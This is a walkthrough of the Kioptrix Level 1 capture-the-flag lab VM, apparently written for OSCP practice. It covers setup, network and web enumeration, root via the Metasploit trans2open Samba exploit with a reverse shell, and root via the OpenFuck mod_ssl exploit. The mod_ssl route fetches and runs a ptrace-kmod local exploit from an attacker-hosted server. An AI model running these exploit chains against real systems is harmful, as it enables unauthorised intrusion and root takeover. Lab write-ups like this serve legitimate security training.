---
title: "Kioptrix: Level 1 Walkthrough"
date: 2025-01-24T00:00:00+00:00
category: Walkthrough
tags: ["walkthrough", "oscp", "ctf", "kioptrix"]
description: "Step-by-step guide to solving the Kioptrix Level 1 machine, covering setup, enumeration, multiple exploitation methods, and privilege escalation. Ideal for beginners."
toc: true
comments: true
---

# **Kioptrix: Level 1 Walkthrough**

---

## **Introduction**

The **Kioptrix Level 1** machine is a beginner-friendly challenge designed to teach core penetration testing skills, including:

- **Network and service enumeration**
- **Exploitation of common vulnerabilities**
- **Privilege escalation techniques**

This walkthrough assumes you have a basic understanding of penetration testing tools and methodologies. Let’s dive in!

---

## **Setup and Configuration**

Before starting the exploitation process, ensure the virtual machine is set up correctly in **VMware Workstation** or **VMware Player**.

### **Steps to Set Up Kioptrix Level 1**

1. **Download** the VM image from the official source.
2. Import the VM into VMware Workstation or Player.
3. Allocate a minimum of **512MB RAM** for smooth operation.
4. Configure the **network adapter** to **NAT Mode** for proper connectivity.

---

### **Common VMware Network Issue**

One common issue faced during the setup is the **network adapter reverting to Bridged Mode**, even when explicitly set to NAT Mode. This can disrupt communication between the host and the virtual machine.

#### **Solution**

To resolve this issue:

1. Locate the VMware configuration file for the VM (e.g., `Kioptrix Level 1.vmx`).
2. Open the file in a text editor and search for the line:
3. Edit its value to `NAT` as shown below.

   <div style="background-color: #f4f4f4; border: 1px solid #ccc; padding: 10px; font-family: 'Courier New', Courier, monospace;">
   memsize = "64"<br>
   ide1:0.present = "FALSE"<br>
   ide1:0.fileName = "F:"<br>
   ide1:0.deviceType = "atapi-cdrom"<br>
   ide1:0.allowGuestConnectionControl = "FALSE"<br>
   ide1:1.present = "FALSE"<br>
   ide1:1.fileName = "Kioptix Level 1.vmdk"<br>
   ide1:1.writeThrough = "TRUE"<br>
   ethernet0.present = "TRUE"<br>
   ethernet0.allowGuestConnectionControl = "FALSE"<br>
   ethernet0.features = "1"<br>
   ethernet0.wakeOnPcktRcv = "FALSE"<br>
   <span style="background-color: yellow; color: black;">ethernet0.networkName = "NAT"</span><br>
   ethernet0.addressType = "generated"<br>
   guestOS = "other24xlinux"<br>
   uuid.location = "56 4d 0e e7 c2 81 21 e5-2d e6 61 b1 79 11 3d da"<br>
   uuid.bios = "56 4d 0e e7 c2 81 21 e5-2d e6 61 b1 79 11 3d da"<br>
   vc.uuid = "52 77 3c 2e 12 81 3a 68-25 23 b3 92 4e 8e 01 ff"<br>
   </div>

4. Now save the configuration file and restart the VM.

---
## **Enumeration**

### **Identifying the Target Machine**

The first step in enumeration is to identify the IP address of the **Kioptrix Level 1** machine in the local network. We can achieve this using the tool **netdiscover**, which is pre-installed in most penetration testing distributions like **Kali Linux**.

#### **Steps to Identify the Target**

1. Open a terminal on your attacker machine.
2. Run the following command to discover all active devices in the network:
   ```bash
   sudo netdiscover -r <NETWORK_RANGE>
   ```

    ```bash
    Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                   
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                            
 _____________________________________________________________________________
    IP               At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.153.1   00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                             
 192.168.153.2   00:50:56:e5:33:16      1      60  VMware, Inc.                                                                                             
 192.168.153.129 00:0c:29:11:3d:da      1      60  VMware, Inc.                                                                                             
 192.168.153.254 00:50:56:ee:1f:12      1      60  VMware, Inc.
 ```
3. The IP of the target host is 192.168.153.129

---

## **Service Enumeration**

Once we have identified the target machine's IP address, the next step is to perform service enumeration to discover running services and their versions.

### **Port Scanning with Nmap**

We will use **Nmap** to identify open ports and running services on the target machine.

1. Run the following command to scan the target for open ports and service versions:

   ```bash
   sudo nmap -p- -sC -sV -O 192.168.153.129 --open
   ```
```bash
Nmap scan report for 192.168.153.129
Host is up (0.00088s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: IMYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2025-01-27T05:00:04+00:00; +1h01m47s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:11:3D:DA (VMware)
Device type: general purpose|media device
Running: Linux 2.4.X, Roku embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:roku:soundbridge_m1500
OS details: Linux 2.4.9 - 2.4.18 (likely embedded), Roku HD1500 media player
Network Distance: 1 hop 
----------------------------------------------------------------
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1h01m46s
```
## **Web Enumeration**
### **Nikto scan**
```bash
┌──(root㉿KALI)-[/home/hrishi]
└─# nikto -host http://192.168.153.129/       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.153.129
+ Target Hostname:    192.168.153.129
+ Target Port:        80
+ Start Time:         2025-01-27 09:44:58 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 08:42:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2025-01-27 09:45:28 (GMT5.5) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
### **Gobuster scan**
```bash
┌──(root㉿KALI)-[/home/hrishi]
└─# gobuster dir -u http://192.168.153.129/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 30 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.153.129/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
```
## **Gaining Access**
### **Using SMB**
> Indetify the SMB version using metasploit module.<br>
> Search for the SMB version in the exploitdb using searchsploit

    ```bash
    msf6 auxiliary(scanner/smb/smb_version) > options
    ----------------------------------------------------------------
    Module options (auxiliary/scanner/smb/smb_version):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT                     no        The target port (TCP)
    THREADS  1                yes       The number of concurrent threads (max one per host)
    msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.153.129
    rhost => 192.168.153.129
    msf6 auxiliary(scanner/smb/smb_version) > run
    [*] 192.168.153.129:139   -   Host could not be identified: Unix (Samba 2.2.1a)
    [*] 192.168.153.129:      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```
    ```bash
    ┌──(root㉿KALI)-[/home/hrishi]
    └─# searchsploit samba 2.2.1a           
    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                                             |  Path
    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                               | osx/remote/9924.rb
    Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                          | multiple/remote/10.c
    Samba < 3.0.20 - Remote Heap Overflow                                                                                      | linux/remote/7701.txt
    Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                              | linux_x86/dos/36741.py
    --------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```
> Found a metasploit module called "trans2open" to exploit
> <br>Run this module with appropriate options and payload

    ```bash
    msf6 exploit(linux/samba/trans2open) > options
    Module options (exploit/linux/samba/trans2open):
    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
    RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT   139              yes       The target port (TCP)
    Payload options (linux/x86/meterpreter/reverse_tcp):
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  192.168.153.128  yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
    Exploit target:
    Id  Name
    --  ----
    0   Samba 2.2.x - Bruteforce
    ----------------------------------------------------------------
    msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.153.129
    rhosts => 192.168.153.129
    msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
    payload => linux/x86/shell_reverse_tcp
    msf6 exploit(linux/samba/trans2open) > run
    [*] Started reverse TCP handler on 192.168.153.128:4444 
    [*] 192.168.153.129:139 - Trying return address 0xbffffdfc...
    [*] 192.168.153.129:139 - Trying return address 0xbffffcfc...
    [*] 192.168.153.129:139 - Trying return address 0xbffffbfc...
    [*] 192.168.153.129:139 - Trying return address 0xbffffafc...
    [*] 192.168.153.129:139 - Trying return address 0xbffff9fc...
    [*] 192.168.153.129:139 - Trying return address 0xbffff8fc...
    [*] 192.168.153.129:139 - Trying return address 0xbffff7fc...
    [*] 192.168.153.129:139 - Trying return address 0xbffff6fc...
    [*] Command shell session 1 opened (192.168.153.128:4444 -> 192.168.153.129:1025) at 2025-01-27 10:37:25 +0530

    [*] Command shell session 2 opened (192.168.153.128:4444 -> 192.168.153.129:1026) at 2025-01-27 10:37:26 +0530
    [*] Command shell session 3 opened (192.168.153.128:4444 -> 192.168.153.129:1027) at 2025-01-27 10:37:28 +0530
    [*] Command shell session 4 opened (192.168.153.128:4444 -> 192.168.153.129:1028) at 2025-01-27 10:37:29 +0530
    id
    uid=0(root) gid=0(root) groups=99(nobody)
    ```
> Got direct reverse shell with root privileges

### **Using Apache Service**
* Search for the Apache service version in the exploitdb<br>
```bash
┌──(root㉿KALI)-[/home/hrishi]
└─# searchsploit mod_ssl 2.8.4 
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                       | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                 | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                 | unix/remote/47080.c
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
* Download OpenFuck exploit from the searchsploit database or download it from the the exploitdb website.
  ```bash
  ┌──(root㉿KALI)-[/home/hrishi/Desktop]
  └─# searchsploit -m 47080
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
  Verified: False
  File Type: C source, ASCII text
  Copied to: /home/hrishi/Desktop/47080.c
  ```
* Compile C file as shown below.
  ```bash
  ┌──(root㉿KALI)-[/home/hrishi/Desktop]
  └─# gcc -Wall 47080.c -lcrypto -lssl -o exploit
  ```
* Run the compiled file as show below to get shell as apache
  
    ```bash
    ──(root㉿KALI)-[/home/hrishi/Desktop]
    └─# ./exploit 0x6b 192.168.153.129 -c 40 
    *******************************************************************
    * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
    *******************************************************************
    * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
    * #hackarena  irc.brasnet.org                                     *
    * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
    * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
    * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
    *******************************************************************
    Connection... 40 of 40
    Establishing SSL connection
    cipher: 0x4043808c   ciphers: 0x80f8050
    Ready to send shellcode
    Spawning shell...
    bash: no job control in this shell
    bash-2.05$ 
    d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
    --02:37:57--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
            => `ptrace-kmod.c.1'
    Connecting to dl.packetstormsecurity.net:443... connected!
    Unable to establish SSL connection.
    Unable to establish SSL connection.
    gcc: file path prefix `/usr/bin' never used
    [-] Unable to attach: Operation not permitted
    bash: [1838: 1] tcsetattr: Invalid argument
    bash-2.05$ 
    bash-2.05$ id
    id
    uid=48(apache) gid=48(apache) groups=48(apache)
    ```
* To escalate the privileges to root download the file ```https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c``` in target host by hosting it in the attack machine and run the python server as shown below.
    ```bash
    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
    └─# wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
    --2025-01-27 18:48:42--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
    Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
    Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 3921 (3.8K) [text/x-csrc]
    Saving to: ‘ptrace-kmod.c’
    ptrace-kmod.c                   100%[====================================================>]   3.83K  --.-KB/s    in 0s      
    2025-01-27 18:48:45 (91.1 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]
    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
    └─# python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    192.168.153.129 - - [27/Jan/2025 18:49:28] "GET /ptrace-kmod.c HTTP/1.0" 200 -
    ```
* Download the file in target machine and compile it as shown below.
    ```bash
    bash-2.05$ wget http://192.168.153.128:8080/ptrace-kmod.c
    wget http://192.168.153.128:8080/ptrace-kmod.c
    --02:53:10--  http://192.168.153.128:8080/ptrace-kmod.c
            => `ptrace-kmod.c'
    Connecting to 192.168.153.128:8080... connected!
    HTTP request sent, awaiting response... 200 OK
    Length: 3,921 [text/x-csrc]

        0K ...                                                   100% @   3.74 MB/s

    02:53:10 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
    bash-2.05$ gcc ptrace-kmod.c -o exploit
    gcc ptrace-kmod.c -o exploit
    ```
* Run the compiled file as shown to get the root access
    ```bash
    bash-2.05$ ls
    ls
    exploit
    ptrace-kmod.c
    bash-2.05$ chmod +x exploit
    chmod +x exploit
    bash-2.05$ ./exploit
    ./exploit
    [+] Attached to 2036
    [+] Waiting for signal
    [+] Signal caught
    [+] Shellcode placed at 0x4001189d
    [+] Now wait for suid shell...
    id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
    ``` 


---
<div style="background-color: #f9f9f9; padding: 1rem; border-radius: 8px; text-align: center; font-size: 1.2rem;">
<strong>Thank you for reading, and until next time, keep learning and growing!</strong>
</div>

---